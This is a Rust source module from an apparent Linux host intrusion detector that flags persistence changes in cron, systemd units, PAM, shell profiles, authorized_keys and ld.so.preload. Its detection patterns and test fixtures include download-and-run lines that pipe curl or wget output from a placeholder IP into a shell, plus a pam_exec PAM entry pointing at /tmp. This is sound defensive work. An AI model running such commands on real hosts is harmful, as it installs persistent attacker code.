//! D3 - Persistence modification.
//!
//! Every rule here follows the same shape: identify the persistence surface,
//! decide whether the change looks operator-driven (see [`Ctx::attribute`]), and
//! emit INFO for interactive edits or HIGH/CRITICAL for unattended ones.

use crate::alert::Finding;
use crate::detect::{content_tag, writer_label, Ctx};
use crate::events::{
    is_container_overlay_path, is_editor_artifact, DetectionId, FileEvent, FileKind, Severity,
};
use crate::proctree::{is_system_tool, is_user_mgmt_tool, role_of, Role};

pub fn evaluate(ev: &FileEvent, ctx: &Ctx) -> Vec<Finding> {
    let mut findings = Vec::new();

    if ev.container && is_container_overlay_path(&ev.path) {
        return findings;
    }
    if matches!(ev.kind, FileKind::Removed | FileKind::MovedFrom) {
        return findings;
    }
    if is_editor_artifact(&ev.path) || ctx.allowlist.path_allowed(&ev.path) {
        return findings;
    }

    findings.extend(ld_preload(ev, ctx));
    findings.extend(ld_conf(ev, ctx));
    findings.extend(authorized_keys(ev, ctx));
    findings.extend(cron_paths(ev, ctx));
    findings.extend(shell_profiles(ev, ctx));
    findings.extend(systemd_units(ev, ctx));
    findings.extend(other_surfaces(ev, ctx));
    findings
}

/// Persistence and login surfaces beyond cron, profiles and units.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum Surface {
    Pam,
    Environment,
    RcLocal,
    Udev,
    Modules,
}

fn surface_of(path: &str) -> Option<Surface> {
    let under = |dir: &str| {
        path.strip_prefix(dir)
            .and_then(|r| r.strip_prefix('/'))
            .is_some_and(|r| !r.is_empty() && !r.contains('/'))
    };
    if under("/etc/pam.d") {
        Some(Surface::Pam)
    } else if path == "/etc/environment" || path == "/etc/security/pam_env.conf" {
        Some(Surface::Environment)
    } else if path == "/etc/rc.local" {
        Some(Surface::RcLocal)
    } else if under("/etc/udev/rules.d") && path.ends_with(".rules") {
        Some(Surface::Udev)
    } else if path == "/etc/modules" || (under("/etc/modules-load.d") && path.ends_with(".conf")) {
        Some(Surface::Modules)
    } else {
        None
    }
}

/// Content that makes a change on this surface clearly dangerous.
fn surface_red_flag(surface: Surface, content: &str) -> Option<String> {
    let lines = content
        .lines()
        .map(str::trim)
        .filter(|l| !l.is_empty() && !l.starts_with('#'));
    let mut hits: Vec<&str> = Vec::new();
    for l in lines {
        let hit = match surface {
            // A preload for every login session.
            Surface::Environment => l.contains("LD_PRELOAD") || l.contains("LD_AUDIT"),
            // pam_exec runs a program on every login; a module given by a
            // path outside the system library dirs is someone's own code.
            Surface::Pam => {
                l.contains("pam_exec")
                    || l.split_whitespace().any(|w| {
                        w.starts_with('/')
                            && w.ends_with(".so")
                            && !w.starts_with("/lib")
                            && !w.starts_with("/usr/lib")
                    })
            }
            // RUN+= executes a program whenever the device event fires.
            Surface::Udev => l.contains("RUN+=") || l.contains("RUN="),
            Surface::RcLocal => looks_like_staging(l),
            Surface::Modules => false,
        };
        if hit {
            hits.push(l);
        }
    }
    (!hits.is_empty()).then(|| {
        hits.into_iter()
            .take(MAX_SHOWN_COMMANDS)
            .collect::<Vec<_>>()
            .join(" | ")
    })
}

fn other_surfaces(ev: &FileEvent, ctx: &Ctx) -> Option<Finding> {
    let surface = surface_of(&ev.path)?;
    let content = ev.content.as_deref().unwrap_or("");
    let red_flag = surface_red_flag(surface, content);
    if red_flag.is_none() && writer_is_installer(ev, ctx) {
        return None;
    }
    let attribution = ctx.attribute(ev);
    let (what_is, why) = match surface {
        Surface::Pam => (
            "PAM configuration",
            "PAM decides who can log in and runs on every authentication. A changed stack can \
             accept any password, log credentials, or run a program at each login.",
        ),
        Surface::Environment => (
            "the global login environment",
            "Variables set here apply to every login session. LD_PRELOAD or LD_AUDIT in it loads \
             a library into everything users start.",
        ),
        Surface::RcLocal => (
            "rc.local",
            "rc.local runs as root at every boot. It's an old but still common place to persist.",
        ),
        Surface::Udev => (
            "a udev rule",
            "udev rules can run programs as root when a device event fires (RUN+=), including \
             at every boot.",
        ),
        Surface::Modules => (
            "the kernel modules loaded at boot",
            "A module listed here is loaded into the kernel at every boot. Rootkits persist \
             this way.",
        ),
    };
    let severity = match (&red_flag, attribution.is_interactive()) {
        (Some(_), false) => Severity::Critical,
        (Some(_), true) => Severity::High,
        (None, false) => Severity::High,
        (None, true) => Severity::Info,
    };
    let title = match (severity, surface) {
        (Severity::Info, _) => format!("Change to {} during a session", what_is),
        (_, Surface::Pam) if red_flag.is_some() => {
            "PAM now runs a program or a non-system module".to_string()
        }
        (_, Surface::Environment) if red_flag.is_some() => {
            "Global environment sets LD_PRELOAD".to_string()
        }
        (_, Surface::Udev) if red_flag.is_some() => "udev rule runs a program".to_string(),
        _ => format!("Change to {} with no session present", what_is),
    };
    let mut f = Finding::new(
        DetectionId::D3,
        severity,
        &title,
        &format!("d3|surface|{}|{}", ev.path, content_tag(content)),
    )
    .what(format!(
        "{} was {} by {}{}.",
        ev.path,
        ev.kind.as_str(),
        writer_label(ev.writer.as_ref()),
        if attribution.is_interactive() {
            ""
        } else {
            " while no interactive session was active on the host"
        }
    ))
    .fact("Path", &ev.path)
    .why(why);
    if let Some(lines) = red_flag {
        f = f.fact("Lines", lines);
    }
    if severity >= Severity::High {
        f = f.actions([
            "Review the file against its package default or your last known version.",
            "Revert anything you didn't change.",
            "Identify the process that wrote the file.",
        ]);
    }
    Some(f)
}

/// Writer belongs to a package/config manager - those legitimately touch every
/// persistence surface on the system.
fn writer_is_installer(ev: &FileEvent, ctx: &Ctx) -> bool {
    let Some(w) = &ev.writer else { return false };
    if !ctx.tool_exemption_applies(w.pid) {
        return false;
    }
    if matches!(
        role_of(&w.comm, &w.exe),
        Role::PackageManager | Role::ConfigManager
    ) {
        return true;
    }
    ctx.tree.chain_of(w.pid).iter().any(|p| {
        matches!(
            role_of(&p.comm, &p.exe),
            Role::PackageManager | Role::ConfigManager
        )
    })
}

fn ld_preload(ev: &FileEvent, _ctx: &Ctx) -> Option<Finding> {
    if ev.path != "/etc/ld.so.preload" {
        return None;
    }
    let libs: Vec<String> = ev
        .content
        .as_deref()
        .unwrap_or("")
        .lines()
        .map(str::trim)
        .filter(|l| !l.is_empty() && !l.starts_with('#'))
        .map(str::to_string)
        .collect();
    // An empty file preloads nothing. Hermian's own unit has systemd create
    // one to mount over, so an empty one is neither news nor a threat.
    if libs.is_empty() && ev.kind != FileKind::Removed {
        return None;
    }
    let mut f = Finding::new(
        DetectionId::D3,
        Severity::Critical,
        "ld.so.preload modified",
        &format!("d3|ld-preload|{}", content_tag(&libs.join("\n"))),
    )
    .what(format!(
        "/etc/ld.so.preload was {} by {}. Every new process on this host will now load the \
         listed libraries before anything else.",
        ev.kind.as_str(),
        writer_label(ev.writer.as_ref())
    ))
    .why(
        "ld.so.preload injects code into every dynamically linked program on the system. It is \
         the most powerful userland rootkit and hooking primitive available and no routine \
         workflow writes to it.",
    )
    .actions([
        "Inspect the file now and remove any library you did not install.",
        "Treat the host as potentially compromised; the listed libraries can hide processes, files and sockets.",
        "Reboot into a known-good state once the entry is removed.",
    ]);
    if !libs.is_empty() {
        f = f.fact("Preloads", libs.join(", "));
    }
    Some(f)
}

fn ld_conf(ev: &FileEvent, ctx: &Ctx) -> Option<Finding> {
    if ev.path != "/etc/ld.so.conf.d" && !ev.path.starts_with("/etc/ld.so.conf.d/") {
        return None;
    }
    let nonstandard: Vec<String> = ev
        .content
        .as_deref()
        .unwrap_or("")
        .lines()
        .map(str::trim)
        .filter(|l| !l.is_empty() && !l.starts_with('#') && !is_standard_ld_line(l))
        .map(str::to_string)
        .collect();

    if ev.content.is_some() && nonstandard.is_empty() {
        if writer_is_installer(ev, ctx) {
            return None;
        }
        return Some(
            Finding::new(
                DetectionId::D3,
                Severity::Info,
                "Dynamic loader config added",
                &format!("d3|ld-conf-info|{}", ev.path),
            )
            .what(format!(
                "{} was {} with standard library paths only.",
                ev.path,
                ev.kind.as_str()
            ))
            .fact("Path", &ev.path)
            .why("Logged for context."),
        );
    }
    let severity = if writer_is_installer(ev, ctx) {
        Severity::Low
    } else {
        Severity::High
    };
    let mut f = Finding::new(
        DetectionId::D3,
        severity,
        "New dynamic loader search path",
        &format!("d3|ld-conf|{}", ev.path),
    )
    .what(format!(
        "{} was {} by {} and adds a library search path outside the standard system directories.",
        ev.path,
        ev.kind.as_str(),
        writer_label(ev.writer.as_ref())
    ))
    .fact("Path", &ev.path)
    .why(
        "A non-standard loader search path lets attacker-controlled shared libraries shadow \
         system ones for every program that links against them.",
    )
    .actions([
        "Remove the unauthorized path and run ldconfig.",
        "Check the referenced directory for unexpected .so files.",
        "Identify the process that wrote the file.",
    ]);
    if !nonstandard.is_empty() {
        f = f.fact("Paths", nonstandard.join(", "));
    }
    Some(f)
}

/// A loader config line that only names standard library directories.
///
/// Prefix checks let `/libevil`, `/usr/../tmp` and `include /tmp/x.conf`
/// through. Now a path has to be one of the standard directories or under
/// one, written plainly, and an include must point back into ld.so.conf.d.
fn is_standard_ld_line(line: &str) -> bool {
    const DIRS: &[&str] = &["/usr", "/lib", "/lib32", "/lib64", "/libx32", "/opt"];
    let plain = |p: &str| {
        p.starts_with('/')
            && !p.contains("/../")
            && !p.contains("/./")
            && !p.contains("//")
            && !p.ends_with("/..")
    };
    if let Some(target) = line.strip_prefix("include") {
        let target = target.trim();
        return plain(target) && target.starts_with("/etc/ld.so.conf.d/");
    }
    // A line may hold several paths separated by spaces, commas or colons.
    let mut paths = line
        .split(|c: char| c.is_whitespace() || c == ',' || c == ':')
        .filter(|p| !p.is_empty())
        .peekable();
    paths.peek().is_some()
        && paths.all(|p| {
            plain(p)
                && DIRS
                    .iter()
                    .any(|d| p == *d || p.strip_prefix(d).is_some_and(|r| r.starts_with('/')))
        })
}

fn authorized_keys(ev: &FileEvent, ctx: &Ctx) -> Option<Finding> {
    let name = ev.path.rsplit('/').next().unwrap_or("");
    if name != "authorized_keys" && name != "authorized_keys2" {
        return None;
    }
    let attribution = ctx.attribute(ev);
    let account = ev
        .path
        .strip_prefix("/home/")
        .and_then(|r| r.split('/').next())
        .or_else(|| {
            if ev.path.starts_with("/root/") {
                Some("root")
            } else {
                None
            }
        })
        .unwrap_or("unknown");
    let key_count = ev.content.as_deref().map(|c| {
        c.lines()
            .filter(|l| l.contains("ssh-") || l.contains("ecdsa-"))
            .count()
    });

    if attribution.is_interactive() {
        return Some(
            Finding::new(
                DetectionId::D3,
                Severity::Info,
                "SSH authorized_keys edited during a session",
                &format!("d3|authorized-keys-session|{}", ev.path),
            )
            .what(format!(
                "{} was {} while an interactive session was active.",
                ev.path,
                ev.kind.as_str()
            ))
            .fact("Account", account)
            .why("Logged for context. Operators add keys interactively (ssh-copy-id, editors)."),
        );
    }
    let mut f = Finding::new(
        DetectionId::D3,
        Severity::High,
        "SSH key added with no session present",
        &format!(
            "d3|authorized-keys|{}|{}",
            ev.path,
            content_tag(ev.content.as_deref().unwrap_or(""))
        ),
    )
    .what(format!(
        "{} was {} by {} while no interactive session was active on the host.",
        ev.path,
        ev.kind.as_str(),
        writer_label(ev.writer.as_ref())
    ))
    .fact("Account", account)
    .why(
        "Planting an SSH key is the most common way to keep access to a compromised account: \
         it survives password rotation and leaves no login prompt.",
    )
    .actions([
        "Review the newest entries in the file and remove any key you do not recognise.",
        "Audit recent activity for this account.",
        "Identify the process that wrote the file.",
    ]);
    if let Some(n) = key_count {
        f = f.fact("Keys now", n.to_string());
    }
    Some(f)
}

const CRON_PATHS: &[&str] = &[
    "/etc/crontab",
    "/etc/cron.d",
    "/etc/cron.hourly",
    "/etc/cron.daily",
    "/etc/cron.weekly",
    "/etc/cron.monthly",
    "/var/spool/cron",
    "/var/spool/cron/crontabs",
    "/etc/anacrontab",
    "/var/spool/anacron",
    // at jobs: Debian keeps them under the cron spool, RHEL in /var/spool/at.
    "/var/spool/at",
];

fn is_at_job(path: &str) -> bool {
    let name = path.rsplit('/').next().unwrap_or("");
    (path.starts_with("/var/spool/cron/atjobs/") || path.starts_with("/var/spool/at/"))
        && !name.starts_with('.')
}

fn cron_paths(ev: &FileEvent, ctx: &Ctx) -> Option<Finding> {
    let is_cron = CRON_PATHS
        .iter()
        .any(|p| ev.path == *p || ev.path.starts_with(&format!("{}/", p)));
    if !is_cron {
        return None;
    }
    if ev.path.starts_with("/var/spool/anacron/") {
        return None;
    }
    let at_job = is_at_job(&ev.path);
    // at's own bookkeeping (.SEQ, spool dirs) isn't a job.
    if !at_job
        && (ev.path.starts_with("/var/spool/cron/atjobs") || ev.path.starts_with("/var/spool/at"))
    {
        return None;
    }
    let system_table = ev.path == "/etc/crontab" || ev.path.starts_with("/etc/cron.d/");
    let content = ev.content.as_deref().unwrap_or("");
    // An at job is a shell script, not a table: every line is a command.
    let all_commands: Vec<String> = if at_job {
        content
            .lines()
            .map(str::trim)
            .filter(|l| !l.is_empty() && !l.starts_with('#'))
            .map(str::to_string)
            .collect()
    } else {
        cron_commands(content, system_table)
    };
    let suspicious_cmd = all_commands.iter().any(|c| looks_like_staging(c));
    // Content first: the real `crontab` installs whatever it's fed, so
    // `(crontab -l; echo '* * * * * curl ...|sh') | crontab -` used to pass
    // as an ordinary crontab edit. The exemptions only cover clean tables.
    if !suspicious_cmd {
        // `crontab -e` writes via the crontab binary; anacron updates its own timestamps.
        if let Some(w) = &ev.writer {
            if (is_system_tool(&w.comm, &w.exe, &["crontab", "anacron", "at", "batch"])
                || is_user_mgmt_tool(&w.comm, &w.exe))
                && ctx.tool_exemption_applies(w.pid)
            {
                return None;
            }
        }
        if writer_is_installer(ev, ctx) {
            return None;
        }
    }
    let attribution = ctx.attribute(ev);
    // Show the staging lines first, and only a few lines in all.
    let mut commands: Vec<String> = all_commands
        .iter()
        .filter(|c| looks_like_staging(c))
        .chain(all_commands.iter().filter(|c| !looks_like_staging(c)))
        .take(MAX_SHOWN_COMMANDS)
        .cloned()
        .collect();
    commands.dedup();

    if attribution.is_interactive() && !suspicious_cmd {
        return Some(
            Finding::new(
                DetectionId::D3,
                Severity::Info,
                "Cron entry edited during a session",
                &format!("d3|cron-session|{}", ev.path),
            )
            .what(format!(
                "{} was {} while an interactive session was active.",
                ev.path,
                ev.kind.as_str()
            ))
            .fact("Path", &ev.path)
            .why("Logged for context. Operators manage cron interactively."),
        );
    }
    let severity = if suspicious_cmd {
        Severity::Critical
    } else {
        Severity::High
    };
    let mut f = Finding::new(
        DetectionId::D3,
        severity,
        if suspicious_cmd {
            "Cron job installed that downloads and runs remote code"
        } else {
            "Cron persistence with no session present"
        },
        &format!(
            "d3|cron|{}|{}",
            ev.path,
            content_tag(&all_commands.join("\n"))
        ),
    )
    .what(format!(
        "{} was {} by {}{}.",
        ev.path,
        ev.kind.as_str(),
        writer_label(ev.writer.as_ref()),
        if attribution.is_interactive() {
            ""
        } else {
            " while no interactive session was active on the host"
        }
    ))
    .fact("Path", &ev.path)
    .why(
        "Cron jobs survive reboots and re-run attacker code on a schedule. Legitimate cron \
         changes come from operators, package installs or configuration management, all of \
         which Hermian recognises; this one matched none of them.",
    )
    .actions([
        "Inspect the new entry and the command it runs.",
        "Remove it if unauthorized and check whether it has already executed.",
        "Identify the process that wrote the file.",
    ]);
    if !commands.is_empty() {
        f = f.fact("Runs", commands.join(" | "));
    }
    Some(f)
}

/// Extract the command part of each cron line. System tables (`/etc/crontab`,
/// `/etc/cron.d/*`) carry a user field after the five time fields; per-user
/// crontabs do not.
fn cron_commands(content: &str, system_table: bool) -> Vec<String> {
    let skip_after_time = if system_table { 1 } else { 0 };
    content
        .lines()
        .map(str::trim)
        .filter(|l| !l.is_empty() && !l.starts_with('#'))
        .filter(|l| {
            // Skip VAR=value assignments (but not commands containing '=').
            match l.split_once('=') {
                Some((k, _)) => !k.chars().all(|c| c.is_ascii_alphanumeric() || c == '_'),
                None => true,
            }
        })
        .filter_map(|l| {
            let mut fields = l.split_whitespace();
            let first = fields.next()?;
            let rest: Vec<&str> = fields.collect();
            let skip = if first.starts_with('@') {
                skip_after_time
            } else {
                4 + skip_after_time
            };
            if rest.len() <= skip {
                return None;
            }
            Some(rest[skip..].join(" "))
        })
        .filter(|c| !c.is_empty())
        .collect()
}

/// Cron commands quoted in an alert. Every line is checked; only the
/// display is capped (a fifth malicious line used to go unchecked).
const MAX_SHOWN_COMMANDS: usize = 4;

/// Split a command line into words, with `|` as a word of its own. Quotes,
/// `;`, `&`, parentheses, backticks and redirections only separate words.
/// Good enough to find "which programs run here", not a shell parser.
fn shell_words(cmd: &str) -> Vec<String> {
    let mut out = Vec::new();
    let mut cur = String::new();
    for c in cmd.chars() {
        if c == '|' {
            if !cur.is_empty() {
                out.push(std::mem::take(&mut cur));
            }
            out.push("|".to_string());
        } else if c.is_whitespace()
            || matches!(
                c,
                ';' | '&' | '(' | ')' | '`' | '\'' | '"' | '<' | '>' | '$' | '{' | '}'
            )
        {
            if !cur.is_empty() {
                out.push(std::mem::take(&mut cur));
            }
        } else {
            cur.push(c);
        }
    }
    if !cur.is_empty() {
        out.push(cur);
    }
    out
}

/// The program name of a word: `/usr/bin/python3.11` -> `python3.11`.
fn prog(word: &str) -> &str {
    word.rsplit('/').next().unwrap_or(word)
}

fn is_shell_or_interpreter(word: &str) -> bool {
    let p = prog(word);
    let stem = p.trim_end_matches(|c: char| c.is_ascii_digit() || c == '.');
    matches!(
        stem,
        "sh" | "bash"
            | "dash"
            | "zsh"
            | "ksh"
            | "ash"
            | "busybox"
            | "python"
            | "perl"
            | "ruby"
            | "php"
            | "node"
    )
}

fn is_transient_path(word: &str) -> bool {
    ["/tmp/", "/dev/shm/", "/var/tmp/"]
        .iter()
        .any(|d| word.starts_with(d))
}

/// Heuristic for "download and execute" one-liners.
///
/// Word-based: substring checks matched `ssh ` and `flush ` as a shell and
/// made e.g. `rsync -e ssh ... /tmp/` CRITICAL (which can auto-isolate).
fn looks_like_staging(cmd: &str) -> bool {
    let words = shell_words(&cmd.to_lowercase());
    let fetches = words
        .iter()
        .any(|w| matches!(prog(w), "curl" | "wget" | "wget2" | "fetch" | "aria2c"));
    let decodes = words.iter().any(|w| prog(w) == "base64");
    // Something piped straight into a shell or interpreter.
    let pipes_into_shell = words
        .windows(2)
        .any(|w| w[0] == "|" && is_shell_or_interpreter(&w[1]));
    // A shell/interpreter running a script from a transient dir, or a program
    // started straight from one.
    let runs_transient = words.first().is_some_and(|w| is_transient_path(w))
        || words
            .windows(2)
            .any(|w| w[0] == "|" && is_transient_path(&w[1]))
        || words.iter().enumerate().any(|(i, w)| {
            is_shell_or_interpreter(w)
                && words[i + 1..]
                    .iter()
                    .find(|a| !a.starts_with('-'))
                    .is_some_and(|a| is_transient_path(a))
        });
    (pipes_into_shell && (fetches || decodes)) || runs_transient
}

fn shell_profiles(ev: &FileEvent, ctx: &Ctx) -> Option<Finding> {
    let is_system_profile = ev.path == "/etc/profile"
        || ev.path == "/etc/bash.bashrc"
        || ev.path == "/etc/zsh/zshrc"
        || ev.path.starts_with("/etc/profile.d/");
    let name = ev.path.rsplit('/').next().unwrap_or("");
    let is_user_profile = matches!(
        name,
        ".bashrc"
            | ".profile"
            | ".bash_profile"
            | ".bash_login"
            | ".zshrc"
            | ".zprofile"
            | ".zshenv"
            | ".zlogin"
    ) && (ev.path.starts_with("/home/") || ev.path.starts_with("/root/"));
    if !is_system_profile && !is_user_profile {
        return None;
    }
    if writer_is_installer(ev, ctx) {
        return None;
    }
    let attribution = ctx.attribute(ev);
    if attribution.is_interactive() {
        return Some(
            Finding::new(
                DetectionId::D3,
                Severity::Info,
                "Shell profile edited during a session",
                &format!("d3|profile-session|{}", ev.path),
            )
            .what(format!("{} was {}.", ev.path, ev.kind.as_str()))
            .fact("Path", &ev.path)
            .why("Logged for context only."),
        );
    }
    Some(
        Finding::new(
            DetectionId::D3,
            Severity::High,
            "Shell profile changed with no session present",
            &format!("d3|profile|{}", ev.path),
        )
        .what(format!(
            "{} was {} by {} while no interactive session was active on the host.",
            ev.path,
            ev.kind.as_str(),
            writer_label(ev.writer.as_ref())
        ))
        .fact("Path", &ev.path)
        .why(
            "Shell profiles execute on every login. Appending to one without an active session \
             is a classic persistence move: the payload runs the next time anyone logs in.",
        )
        .actions([
            "Review the tail of the file for appended lines.",
            "Remove unauthorized content.",
            "Identify the process that wrote the file.",
        ]),
    )
}

/// Directories systemd loads units from that we watch: the admin dir, the
/// vendor dirs (packages only, normally), and per-user unit dirs.
fn systemd_unit_rest(path: &str) -> Option<&str> {
    for base in [
        "/etc/systemd/system/",
        "/usr/lib/systemd/system/",
        "/lib/systemd/system/",
    ] {
        if let Some(r) = path.strip_prefix(base) {
            return Some(r);
        }
    }
    // ~/.config/systemd/user/ (root's or a user's): started at login.
    path.split_once("/.config/systemd/user/")
        .filter(|(home, _)| home == &"/root" || home.starts_with("/home/"))
        .map(|(_, r)| r)
}

fn systemd_units(ev: &FileEvent, ctx: &Ctx) -> Option<Finding> {
    systemd_unit_rest(&ev.path)?;
    let is_unit = [
        ".service",
        ".timer",
        ".socket",
        ".path",
        ".mount",
        ".target",
        ".automount",
    ]
    .iter()
    .any(|s| ev.path.ends_with(s));
    let is_enable_link = ev.path.contains(".wants/") || ev.path.contains(".requires/");
    // `x.service.d/override.conf` can replace ExecStart= of an existing,
    // package-owned service: the quietest way to persist through systemd.
    let is_dropin = is_systemd_dropin(&ev.path);
    if !is_unit && !is_enable_link && !is_dropin {
        return None;
    }
    if ev.managed_by_package == Some(true) {
        return None;
    }
    let execs = unit_exec_lines(ev.content.as_deref().unwrap_or(""));
    // The program itself in a transient dir, or a staging one-liner. Any
    // mention of /tmp used to count, so `--socket /tmp/app.sock` was CRITICAL.
    // Show the suspicious command if there is one, else the first.
    let exec_line = execs
        .iter()
        .find(|e| looks_like_staging(e))
        .or(execs.first())
        .cloned();
    let suspicious_exec = execs.iter().any(|e| looks_like_staging(e));
    // An installer writing a unit that runs from /tmp or pipes curl into a
    // shell isn't a normal install; only clean units get the exemption.
    if !suspicious_exec && writer_is_installer(ev, ctx) {
        return None;
    }
    // `systemctl enable` is performed by systemd itself (PID 1) creating the symlink.
    if is_enable_link {
        if let Some(w) = &ev.writer {
            if w.pid == 1 || is_system_tool(&w.comm, &w.exe, &["systemctl", "systemd"]) {
                return None;
            }
        }
    }
    let attribution = ctx.attribute(ev);

    if attribution.is_interactive() && !suspicious_exec {
        return Some(
            Finding::new(
                DetectionId::D3,
                Severity::Info,
                "systemd unit edited during a session",
                &format!("d3|systemd-session|{}", ev.path),
            )
            .what(format!(
                "{} was {} while an interactive session was active.",
                ev.path,
                ev.kind.as_str()
            ))
            .fact("Path", &ev.path)
            .why("Logged for context. Operators install units interactively."),
        );
    }
    let severity = if suspicious_exec {
        Severity::Critical
    } else {
        Severity::High
    };
    let mut f = Finding::new(
        DetectionId::D3,
        severity,
        if is_enable_link {
            "systemd unit enabled outside of systemctl"
        } else if is_dropin && suspicious_exec {
            "systemd drop-in makes a service run from a transient directory"
        } else if is_dropin {
            "systemd drop-in added with no session present"
        } else if suspicious_exec {
            "systemd unit installed that runs from a transient directory"
        } else {
            "systemd unit installed with no session present"
        },
        &format!("d3|systemd|{}|{}", ev.path, content_tag(&execs.join("\n"))),
    )
    .what(format!(
        "{} was {} by {} and does not belong to any installed package.",
        ev.path,
        ev.kind.as_str(),
        writer_label(ev.writer.as_ref())
    ))
    .fact("Unit", &ev.path)
    .why(
        "A systemd unit is code that runs at boot with whatever privileges it declares. New \
         units normally arrive via packages or an operator; this one arrived another way.",
    )
    .actions([
        "Read the unit file and the binary it executes.",
        "systemctl disable --now the unit and remove the file if unauthorized.",
        "Identify the process that wrote the file.",
    ]);
    if let Some(e) = exec_line {
        f = f.fact("Command", e);
    }
    Some(f)
}

/// `<unit dir>/<unit>.d/<name>.conf`
pub fn is_systemd_dropin(path: &str) -> bool {
    let Some(rest) = systemd_unit_rest(path) else {
        return false;
    };
    match rest.split_once('/') {
        Some((dir, file)) => dir.ends_with(".d") && !file.contains('/') && file.ends_with(".conf"),
        None => false,
    }
}

/// Every command a unit or drop-in runs. An empty `ExecStart=` only resets
/// the list (the usual first line of an override), so it's skipped. systemd
/// prefixes (`-`, `@`, `+`, `!`, `:`) are stripped.
fn unit_exec_lines(content: &str) -> Vec<String> {
    const KEYS: &[&str] = &[
        "ExecStart",
        "ExecStartPre",
        "ExecStartPost",
        "ExecStop",
        "ExecStopPost",
        "ExecReload",
        "ExecCondition",
    ];
    // systemd allows spaces around '=' (`ExecStart = /tmp/x`).
    content
        .lines()
        .map(str::trim)
        .filter_map(|l| {
            let (k, v) = l.split_once('=')?;
            KEYS.contains(&k.trim()).then_some(v)
        })
        .map(|v| {
            v.trim()
                .trim_start_matches(['-', '@', '+', '!', ':'])
                .trim()
        })
        .filter(|v| !v.is_empty())
        .map(str::to_string)
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn cron_command_extraction() {
        let c = "SHELL=/bin/sh\n# comment\n* * * * * root curl -s http://x/y | sh\n@reboot root /tmp/.a\n";
        let cmds = cron_commands(c, true);
        assert_eq!(cmds, vec!["curl -s http://x/y | sh", "/tmp/.a"]);
        let u = "PATH=/usr/bin\n0 3 * * * /usr/bin/backup --flag=1\n@daily /home/dev/sync\n";
        let cmds = cron_commands(u, false);
        assert_eq!(cmds, vec!["/usr/bin/backup --flag=1", "/home/dev/sync"]);
    }

    #[test]
    fn dropin_paths() {
        assert!(is_systemd_dropin(
            "/etc/systemd/system/ssh.service.d/override.conf"
        ));
        assert!(is_systemd_dropin(
            "/etc/systemd/system/getty@.service.d/x.conf"
        ));
        assert!(!is_systemd_dropin("/etc/systemd/system/ssh.service"));
        assert!(!is_systemd_dropin(
            "/etc/systemd/system/ssh.service.d/notes.txt"
        ));
        assert!(!is_systemd_dropin(
            "/etc/systemd/system/multi-user.target.wants/x.service"
        ));
        assert!(!is_systemd_dropin("/etc/systemd/system/a.d/b/c.conf"));
    }

    #[test]
    fn unit_exec_extraction() {
        let c =
            "[Service]\nExecStart=\nExecStart=-/dev/shm/.x --daemon\nExecStartPre=+/usr/bin/true\n";
        assert_eq!(
            unit_exec_lines(c),
            vec!["/dev/shm/.x --daemon", "/usr/bin/true"]
        );
        assert!(unit_exec_lines("[Service]\nRestart=always\n").is_empty());
    }

    mod engine_level {
        use crate::alert::Alert;
        use crate::baseline::Baseline;
        use crate::config::Config;
        use crate::engine::Engine;
        use crate::events::*;
        use chrono::{DateTime, Utc};

        fn engine() -> Engine {
            let cfg = Config::default();
            let allow = cfg.allowlist.clone();
            Engine::new(cfg, allow, Baseline::new(false, 24, Utc::now()), "t".into())
        }

        fn exec(t: DateTime<Utc>, pid: u32, ppid: u32, comm: &str, exe: &str) -> Event {
            Event::Exec(ExecEvent {
                ts: t,
                pid,
                ppid,
                uid: 0,
                gid: 0,
                comm: comm.into(),
                exe: exe.into(),
                argv0: exe.into(),
                ld_preload: false,
                deleted_exe: false,
                tty_nr: 0,
                container: false,
                container_id: None,
            })
        }

        fn write(t: DateTime<Utc>, path: &str, w: (u32, &str, &str), content: &str) -> Event {
            Event::File(FileEvent {
                ts: t,
                path: path.into(),
                kind: FileKind::MovedTo,
                dev: 0,
                ino: 0,
                writer: Some(WriterInfo {
                    pid: w.0,
                    uid: 0,
                    comm: w.1.into(),
                    exe: w.2.into(),
                    tty_nr: 0,
                }),
                session_present: false,
                is_suid: false,
                has_file_caps: false,
                content: Some(content.into()),
                container: false,
                managed_by_package: None,
            })
        }

        fn d3(a: &[Alert]) -> Option<Severity> {
            a.iter()
                .filter(|a| a.detection == DetectionId::D3)
                .map(|a| a.severity)
                .max()
        }

        fn base(eng: &mut Engine, t: DateTime<Utc>) {
            eng.process(exec(t, 1, 0, "systemd", "/usr/lib/systemd/systemd"));
            eng.process(exec(t, 400, 1, "cron", "/usr/sbin/cron"));
            eng.process(exec(t, 401, 400, "sh", "/usr/bin/dash"));
        }

        #[test]
        fn real_crontab_installing_a_downloader_is_critical() {
            let mut eng = engine();
            let t = Utc::now();
            base(&mut eng, t);
            eng.process(exec(t, 402, 401, "crontab", "/usr/bin/crontab"));
            let a = eng.process(write(
                t,
                "/var/spool/cron/crontabs/root",
                (402, "crontab", "/usr/bin/crontab"),
                "0 3 * * * /usr/bin/backup\n* * * * * curl -fsSL http://198.51.100.9/k | sh\n",
            ));
            assert_eq!(d3(&a), Some(Severity::Critical), "{:?}", a);
        }

        #[test]
        fn real_crontab_with_a_clean_table_is_silent() {
            let mut eng = engine();
            let t = Utc::now();
            base(&mut eng, t);
            eng.process(exec(t, 402, 401, "crontab", "/usr/bin/crontab"));
            let a = eng.process(write(
                t,
                "/var/spool/cron/crontabs/root",
                (402, "crontab", "/usr/bin/crontab"),
                "0 3 * * * /usr/bin/backup\n",
            ));
            assert_eq!(d3(&a), None, "{:?}", a);
        }

        #[test]
        fn fifth_cron_line_is_still_checked() {
            let mut eng = engine();
            let t = Utc::now();
            base(&mut eng, t);
            let table = "1 * * * * /bin/a\n2 * * * * /bin/b\n3 * * * * /bin/c\n4 * * * * /bin/d\n\
                         5 * * * * wget -qO- http://198.51.100.9/k | bash\n";
            let a = eng.process(write(
                t,
                "/var/spool/cron/crontabs/root",
                (401, "sh", "/usr/bin/dash"),
                table,
            ));
            let alert = a
                .iter()
                .find(|a| a.detection == DetectionId::D3)
                .unwrap_or_else(|| panic!("{:?}", a));
            assert_eq!(alert.severity, Severity::Critical);
            let runs = alert.facts.iter().find(|f| f.label == "Runs").unwrap();
            assert!(runs.value.starts_with("wget"), "{}", runs.value);
        }

        #[test]
        fn new_surfaces_are_watched() {
            let mut eng = engine();
            let t = Utc::now();
            base(&mut eng, t);
            let w = (401, "sh", "/usr/bin/dash");
            let pam = eng.process(write(
                t,
                "/etc/pam.d/sshd",
                w,
                "auth optional pam_exec.so /tmp/.k\n@include common-auth\n",
            ));
